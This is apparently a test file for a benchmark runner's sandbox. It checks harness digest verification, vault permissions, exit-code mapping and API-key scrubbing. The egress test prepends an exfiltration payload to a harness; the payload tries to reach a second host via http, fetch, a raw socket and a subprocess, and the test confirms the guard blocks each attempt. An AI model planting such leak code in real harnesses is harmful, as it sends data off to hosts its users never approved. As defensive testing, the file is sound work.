// Runner execution tests: digest verification (offline and against a
// registry), the egress guard, vault permissions, accounting, exit-code
// mapping, and the operator-vs-harness context merge.
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import type { Server } from 'node:http';
import {
  appendFileSync,
  existsSync,
  readdirSync,
  readFileSync,
  statSync,
  writeFileSync,
} from 'node:fs';
import { join } from 'node:path';
import { after, test } from 'node:test';
import { validate } from '@iwik/contracts';
import { deriveAccounting, run, RunnerError, vaultPaths } from '../src/index.js';
import type { RunDraft, VaultMeta } from '../src/index.js';
import {
  allow,
  cleanupTemp,
  copyPack,
  makeHome,
  OPERATOR_CONTEXT,
  packsDir as realPacksDir,
  readJson,
  rewriteDigests,
  startStub,
} from './helpers.js';

const PROTOCOL = 'inference-api/latency@1';
const closers: Array<() => Promise<void> | void> = [];
after(async () => {
  for (const close of closers.splice(0)) await close();
  cleanupTemp();
});

function listen(server: Server): Promise<number> {
  return new Promise((resolve) => {
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      resolve(typeof address === 'object' && address !== null ? address.port : 0);
    });
  });
}

async function stubTarget(options: Record<string, unknown> = {}) {
  const stub = await startStub({ delayMs: 5, errorRate: 0.1, seed: 7, ...options });
  closers.push(() => stub.close());
  return stub;
}

function assertPrivate(dir: string): void {
  assert.equal(statSync(dir).mode & 0o777, 0o700, `${dir} must be 0700`);
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const full = join(dir, entry.name);
    if (entry.isDirectory()) assertPrivate(full);
    else assert.equal(statSync(full).mode & 0o777, 0o600, `${full} must be 0600`);
  }
}

test('offline run against the stub: succeeded, accounting from attempts.jsonl, vault 0700/0600', async () => {
  const stub = await stubTarget();
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  const result = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 20,
    offline: true,
    targetKind: 'fixture',
    context: [
      'model.requested=stub-model',
      'concurrency=1',
      'cache_disabled=true',
      'client_region=local',
    ],
  });
  assert.equal(result.execution_status, 'succeeded');
  assert.equal(result.accounting.planned, 20);
  assert.equal(result.accounting.attempted, 20);
  assert.equal(result.accounting.failed, stub.stub.stats.errors);
  assert.equal(result.accounting.succeeded + result.accounting.failed, 20);
  assert.deepEqual(result.egress_violations, []);
  assert.deepEqual(result.context_unknown, []);

  const paths = vaultPaths(home, result.run_id);
  for (const file of [
    paths.draft,
    paths.meta,
    paths.input,
    paths.stdout,
    paths.stderr,
    paths.attempts,
    paths.result,
    paths.context,
  ]) {
    assert.ok(existsSync(file), `${file} should exist`);
  }
  assert.ok(!existsSync(paths.run), 'run.json is written by preview, not run');
  assertPrivate(paths.dir);
  assert.equal(statSync(join(home)).mode & 0o777, 0o700);
  assert.equal(statSync(join(home, 'key.ed25519')).mode & 0o777, 0o600);
  assert.equal(statSync(join(home, 'token')).mode & 0o777, 0o600);

  const draft = readJson<RunDraft>(paths.draft);
  assert.equal(draft.target.label, stub.url);
  assert.equal(draft.target.kind, 'fixture');
  assert.match(draft.target.label_digest, /^sha256:[0-9a-f]{64}$/);
  assert.equal(draft.accounting.attempted, 20);
  assert.equal((draft.result as Record<string, unknown>)['protocol_ref'], PROTOCOL);
  assert.deepEqual(
    draft.context.slice(0, 6).map((f) => [f.key, f.origin]),
    [
      ['model.requested', 'operator_reported'],
      ['model.reported', 'measured'],
      ['concurrency', 'measured'],
      ['retry_policy', 'measured'],
      ['cache_disabled', 'operator_reported'],
      ['client_region', 'operator_reported'],
    ],
  );
  assert.equal(draft.context.find((f) => f.key === 'model.reported')?.value, 'stub-model');
  assert.ok(draft.artifacts.some((a) => a.kind === 'attempts' && a.access === 'vault_only'));
  const meta = readJson<VaultMeta>(paths.meta);
  assert.equal(meta.manifest_source, 'offline');
  assert.equal(meta.target.allowed_hosts, `127.0.0.1:${stub.port}`);
  assert.equal(meta.harness.exit_code, 0);
  // the draft is a valid Run once a submission is attached
  const probe = {
    ...draft,
    target: { kind: draft.target.kind, label_digest: draft.target.label_digest },
    submission: {
      signed_at: draft.ended_at,
      key_id: 'k',
      signature: 'AA==',
      sharing_policy: 'private',
    },
  };
  assert.equal(validate('Run', probe).ok, true);
});

test('a second run in the same home is a separate vault entry (rerun-safe)', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  const opts = {
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 2,
    offline: true,
    targetKind: 'fixture' as const,
    context: OPERATOR_CONTEXT,
  };
  const a = await run(opts);
  const b = await run(opts);
  assert.notEqual(a.run_id, b.run_id);
  assert.ok(existsSync(vaultPaths(home, a.run_id).draft));
  assert.ok(existsSync(vaultPaths(home, b.run_id).draft));
});

test('digest: one byte changed in harness/index.js refuses with harness_digest_mismatch (offline)', async () => {
  const stub = await stubTarget();
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  const { packsDir, packDir } = copyPack();
  appendFileSync(join(packDir, 'harness', 'index.js'), ' ');
  await assert.rejects(
    run({
      home,
      protocol: PROTOCOL,
      target: stub.url,
      offline: true,
      targetKind: 'fixture',
      packsDir,
      context: OPERATOR_CONTEXT,
    }),
    (e: unknown) =>
      e instanceof RunnerError && e.code === 'harness_digest_mismatch' && e.exitCode === 4,
  );
  assert.equal(stub.stub.stats.requests, 0, 'the harness must not have run');
  assert.deepEqual(readdirSync(join(home, 'vault')), []);
});

test('digest: the registry manifest is authoritative; a harness it does not list is refused', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  const real = readJson<Record<string, unknown>>(
    join(realPacksDir, 'inference-api', 'protocols', 'latency', 'protocol.json'),
  );
  let served: Record<string, unknown> = { ...real };
  let hits = 0;
  const registry = createServer((req, res) => {
    hits += 1;
    if (req.headers.authorization !== `Bearer test-only-node-token-${'b'.repeat(24)}`) {
      res.writeHead(401, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ error: { code: 'unauthorized', message: 'no' } }));
      return;
    }
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(JSON.stringify(served));
  });
  const port = await listen(registry);
  closers.push(() => new Promise<void>((resolve) => registry.close(() => resolve())));
  const { home } = makeHome(`http://127.0.0.1:${port}`);
  allow(home, `127.0.0.1:${stub.port}`);

  // the real manifest accepts the real pack
  const ok = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 1,
    targetKind: 'fixture',
    context: OPERATOR_CONTEXT,
  });
  assert.equal(ok.execution_status, 'succeeded', ok.exclusion_reason);
  assert.equal(readJson<VaultMeta>(vaultPaths(home, ok.run_id).meta).manifest_source, 'registry');
  assert.equal(hits, 1);

  // a manifest listing a different harness refuses the local one
  served = { ...real, compatibility: { harness_digests: ['sha256:' + '0'.repeat(64)] } };
  await assert.rejects(
    run({
      home,
      protocol: PROTOCOL,
      target: stub.url,
      planned: 1,
      targetKind: 'fixture',
      context: OPERATOR_CONTEXT,
    }),
    (e: unknown) => e instanceof RunnerError && e.code === 'harness_digest_mismatch',
  );
  // a manifest whose pack digest differs refuses too
  served = { ...real, pack: { pack_digest: 'sha256:' + '1'.repeat(64) } };
  await assert.rejects(
    run({
      home,
      protocol: PROTOCOL,
      target: stub.url,
      planned: 1,
      targetKind: 'fixture',
      context: OPERATOR_CONTEXT,
    }),
    (e: unknown) => e instanceof RunnerError && e.code === 'pack_digest_mismatch',
  );
  // a protocol that is not accepted does not run
  served = { ...real, status: 'draft' };
  await assert.rejects(
    run({
      home,
      protocol: PROTOCOL,
      target: stub.url,
      planned: 1,
      targetKind: 'fixture',
      context: OPERATOR_CONTEXT,
    }),
    (e: unknown) => e instanceof RunnerError && e.code === 'protocol_not_accepted',
  );
  assert.equal(stub.stub.stats.completions, 1, 'only the accepted run reached the target');
});

test('egress: a harness reaching for a second host is blocked and the run is excluded', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  let leaked = 0;
  const other = createServer((_req, res) => {
    leaked += 1;
    res.end('leak');
  });
  const otherPort = await listen(other);
  closers.push(() => new Promise<void>((resolve) => other.close(() => resolve())));

  const { packsDir, packDir } = copyPack();
  const original = readFileSync(join(packDir, 'harness', 'index.js'), 'utf8').replace(
    /^#!.*\n/,
    '',
  );
  // Prepend an exfiltration attempt via http, fetch, a raw socket, and a
  // subprocess; then run the real harness against the allowed target.
  const naughty =
    `'use strict';\n` +
    `const __net = require('node:net'); const __http = require('node:http'); const __cp = require('node:child_process');\n` +
    `const __leak = 'http://127.0.0.1:${otherPort}/leak';\n` +
    `function __swallow(p) { return p.catch(() => {}); }\n` +
    `__swallow(new Promise((resolve) => { const r = __http.get(__leak, () => resolve()); r.on('error', () => resolve()); }));\n` +
    `__swallow(fetch(__leak).then(() => {}));\n` +
    `__swallow(new Promise((resolve) => { const s = __net.connect({ host: '127.0.0.1', port: ${otherPort} }); s.on('error', () => resolve()); s.on('connect', () => { s.end(); resolve(); }); }));\n` +
    `try { __cp.execSync('true'); } catch {}\n`;
  writeFileSync(join(packDir, 'harness', 'index.js'), naughty + original);
  rewriteDigests(packDir);

  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  const result = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 3,
    offline: true,
    targetKind: 'fixture',
    packsDir,
    context: OPERATOR_CONTEXT,
  });
  assert.equal(leaked, 0, 'the second host must never be reached');
  assert.equal(result.execution_status, 'excluded');
  // the wire vocabulary names no host; the vault detail does
  assert.equal(result.exclusion_reason, 'egress_denied');
  assert.match(result.exclusion_detail ?? '', /^harness attempted 127\.0\.0\.1:\d+/);
  assert.ok(result.egress_violations.length >= 3, JSON.stringify(result.egress_violations));
  const apis = new Set(result.egress_violations.map((v) => (v as { api: string }).api));
  assert.ok(apis.has('net.connect'));
  assert.ok(apis.has('fetch'));
  assert.ok(apis.has('child_process.execSync'));
  const paths = vaultPaths(home, result.run_id);
  assert.match(readFileSync(paths.stderr, 'utf8'), /egress denied: 127\.0\.0\.1:\d+/);
  const draft = readJson<RunDraft>(paths.draft);
  assert.equal(draft.execution_status, 'excluded');
  assert.equal(draft.exclusion_reason, 'egress_denied');
  assert.equal(readJson<VaultMeta>(paths.meta).exclusion_detail, result.exclusion_detail);
  // accounting still reconciles: attempts the harness made are counted, the rest excluded
  const a = draft.accounting;
  assert.equal(a.planned, 3);
  assert.equal(a.planned, a.attempted + a.excluded + a.unobserved);
  assertPrivate(paths.dir);
  // the allowed target was still reachable through the guard
  assert.equal(stub.stub.stats.completions, 3);
});

test('exit codes: 2 -> excluded with the stderr reason, 3 -> unobserved, crash -> failed', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);

  // exit 2: the real harness refuses concurrency != 1 as a protocol violation
  const violated = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 4,
    offline: true,
    targetKind: 'fixture',
    context: { ...OPERATOR_CONTEXT, concurrency: 2 },
  });
  assert.equal(violated.execution_status, 'excluded');
  assert.equal(violated.exclusion_reason, 'harness_protocol_violation');
  assert.match(violated.exclusion_detail ?? '', /concurrency = 1/);
  assert.deepEqual(violated.accounting, {
    planned: 4,
    attempted: 0,
    succeeded: 0,
    failed: 0,
    excluded: 4,
    unobserved: 0,
  });

  // exit 3: nothing listens on the allowed port
  const closed = createServer();
  const deadPort = await listen(closed);
  await new Promise<void>((resolve) => closed.close(() => resolve()));
  allow(home, `127.0.0.1:${deadPort}`);
  const unreachable = await run({
    home,
    protocol: PROTOCOL,
    target: `http://127.0.0.1:${deadPort}`,
    planned: 4,
    offline: true,
    targetKind: 'fixture',
    timeoutMs: 2000,
    context: OPERATOR_CONTEXT,
  });
  assert.equal(unreachable.execution_status, 'unobserved');
  assert.equal(unreachable.exclusion_reason, undefined);
  assert.deepEqual(unreachable.accounting, {
    planned: 4,
    attempted: 0,
    succeeded: 0,
    failed: 0,
    excluded: 0,
    unobserved: 4,
  });
  assert.equal(
    validate('Run', {
      ...readJson<RunDraft>(vaultPaths(home, unreachable.run_id).draft),
      target: { kind: 'service', label_digest: 'sha256:' + 'a'.repeat(64) },
      submission: {
        signed_at: '2026-01-01T00:00:00Z',
        key_id: 'k',
        signature: 'AA==',
        sharing_policy: 'private',
      },
    }).ok,
    true,
  );

  // crash: a harness that throws
  const { packsDir, packDir } = copyPack();
  writeFileSync(join(packDir, 'harness', 'index.js'), `'use strict';\nthrow new Error('boom');\n`);
  rewriteDigests(packDir);
  allow(home, `127.0.0.1:${stub.port}`);
  const crashed = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 2,
    offline: true,
    targetKind: 'fixture',
    packsDir,
    context: OPERATOR_CONTEXT,
  });
  assert.equal(crashed.execution_status, 'failed');
  assert.equal(crashed.harness.exit_code, 1);
  assert.deepEqual(crashed.accounting, {
    planned: 2,
    attempted: 0,
    succeeded: 0,
    failed: 0,
    excluded: 0,
    unobserved: 2,
  });
  assert.ok(crashed.issues.some((i) => /crashed/.test(i)));

  // a harness that exits 0 without backing attempts is excluded, not succeeded
  writeFileSync(join(packDir, 'harness', 'index.js'), `'use strict';\nprocess.exit(0);\n`);
  rewriteDigests(packDir);
  const hollow = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 2,
    offline: true,
    targetKind: 'fixture',
    packsDir,
    context: OPERATOR_CONTEXT,
  });
  assert.equal(hollow.execution_status, 'excluded');
  assert.equal(hollow.exclusion_reason, 'attempt_count_mismatch');
  assert.match(hollow.exclusion_detail ?? '', /reported 0 of 2 planned/);
});

test('context merge: measured beats operator_reported (logged); missing required keys are unknown, not dropped', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  // the operator claims exponential retries; the harness measures none
  const overridden = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 2,
    offline: true,
    targetKind: 'fixture',
    context: { ...OPERATOR_CONTEXT, retry_policy: 'exponential' },
  });
  assert.equal(overridden.execution_status, 'succeeded');
  assert.deepEqual(overridden.context_overrides, [
    {
      key: 'retry_policy',
      operator_value: 'exponential',
      harness_value: 'none',
      harness_origin: 'measured',
    },
  ]);
  const draft = readJson<RunDraft>(vaultPaths(home, overridden.run_id).draft);
  assert.deepEqual(
    draft.context.find((f) => f.key === 'retry_policy'),
    { key: 'retry_policy', value: 'none', origin: 'measured' },
  );
  assert.deepEqual(
    readJson<VaultMeta>(vaultPaths(home, overridden.run_id).meta).context_overrides,
    overridden.context_overrides,
  );

  // cache_disabled and client_region come from nobody: present as unknown, run excluded
  const partial = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 2,
    offline: true,
    targetKind: 'fixture',
    context: { 'model.requested': 'stub-model', concurrency: 1 },
  });
  assert.equal(partial.execution_status, 'excluded');
  assert.equal(partial.exclusion_reason, 'required_context_unknown');
  assert.equal(partial.exclusion_detail, 'required context unknown: cache_disabled, client_region');
  assert.deepEqual(partial.context_unknown, ['cache_disabled', 'client_region']);
  const partialDraft = readJson<RunDraft>(vaultPaths(home, partial.run_id).draft);
  assert.deepEqual(
    partialDraft.context.find((f) => f.key === 'cache_disabled'),
    { key: 'cache_disabled', value: null, origin: 'unknown' },
  );
  assert.deepEqual(
    partialDraft.context.find((f) => f.key === 'client_region'),
    { key: 'client_region', value: null, origin: 'unknown' },
  );
  assert.equal(partialDraft.context.length >= 6, true);
});

test('deriveAccounting reconciles under every remainder rule', () => {
  const lines = [{ status: 'succeeded' }, { status: 'failed' }, { status: 'excluded' }];
  const a = deriveAccounting(lines, 5, 'unobserved').accounting;
  assert.deepEqual(a, {
    planned: 5,
    attempted: 2,
    succeeded: 1,
    failed: 1,
    excluded: 1,
    unobserved: 2,
  });
  const b = deriveAccounting(lines, 5, 'excluded').accounting;
  assert.deepEqual(b, {
    planned: 5,
    attempted: 2,
    succeeded: 1,
    failed: 1,
    excluded: 3,
    unobserved: 0,
  });
  const over = deriveAccounting(lines, 2, 'excluded');
  assert.equal(over.overflow, 1);
  assert.equal(
    over.accounting.planned,
    over.accounting.attempted + over.accounting.excluded + over.accounting.unobserved,
  );
  for (const acc of [a, b, over.accounting]) {
    assert.equal(acc.attempted, acc.succeeded + acc.failed);
    assert.equal(acc.planned, acc.attempted + acc.excluded + acc.unobserved);
  }
});

test('api key: read from the named env var, given to the harness, scrubbed from the vault afterwards', async () => {
  const stub = await stubTarget({ errorRate: 0 });
  const { home } = makeHome();
  allow(home, `127.0.0.1:${stub.port}`);
  const secret = 'sk-' + 'x'.repeat(30);
  const result = await run({
    home,
    protocol: PROTOCOL,
    target: stub.url,
    planned: 1,
    offline: true,
    targetKind: 'fixture',
    apiKeyEnv: 'IWIK_TEST_TARGET_KEY',
    env: { ...process.env, IWIK_TEST_TARGET_KEY: secret },
    context: OPERATOR_CONTEXT,
  });
  assert.equal(result.execution_status, 'succeeded');
  const paths = vaultPaths(home, result.run_id);
  for (const file of readdirSync(paths.dir)) {
    const full = join(paths.dir, file);
    if (statSync(full).isFile())
      assert.ok(!readFileSync(full, 'utf8').includes(secret), `${file} must not hold the key`);
  }
  await assert.rejects(
    run({
      home,
      protocol: PROTOCOL,
      target: stub.url,
      planned: 1,
      offline: true,
      targetKind: 'fixture',
      apiKeyEnv: 'IWIK_TEST_MISSING',
      env: { ...process.env },
      context: OPERATOR_CONTEXT,
    }),
    (e: unknown) => e instanceof RunnerError && e.code === 'usage',
  );
});
